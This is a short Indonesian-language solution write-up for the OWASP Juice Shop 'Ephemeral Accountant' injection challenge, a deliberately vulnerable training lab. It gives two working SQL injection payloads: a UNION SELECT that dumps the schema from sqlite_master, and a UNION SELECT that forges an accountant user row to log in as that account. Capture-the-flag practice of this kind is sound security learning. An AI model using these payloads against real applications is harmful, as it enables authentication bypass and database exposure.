# 1. Ephemeral Accountant

# 2. https://juice-shop.herokuapp.com/#/score-board?categories=Injection&showDisabledChallenges=false

# 3. Penyelesaian

a. Cek struktur database yang digunakan menggunakan ```banana'))+UNION+SELECT+sql1,2,3,4,5,6,7,8,9+FROM+sqlite_master--```

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3401ba82-05cb-41f5-96e7-899d99fbabcd" />

b. Gunakan payload ```payload ' UNION SELECT * FROM (SELECT 20 AS id, 'acc0unt4nt@juice-sh.op' AS username, 'acc0unt4nt@juice-sh.op' AS email, 'test1234' AS password, 'accounting' AS role, '123' AS deluxeToken, '1.2.3.4' AS lastLoginIp, '/assets/public/images/uploads/default.svg' AS profileImage, '' AS totpSecret, 1 AS isActive, 12983283 AS createdAt, 133424 AS updatedAt, NULL AS deletedAt) AS tmp WHERE '1'='1';--```

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/18934986-93c0-4a2a-aa69-d751d040449c" />

<img width="1284" height="54" alt="image" src="https://github.com/user-attachments/assets/e22c5ca6-a88e-4fdf-be04-d54aa9ab7af7" />
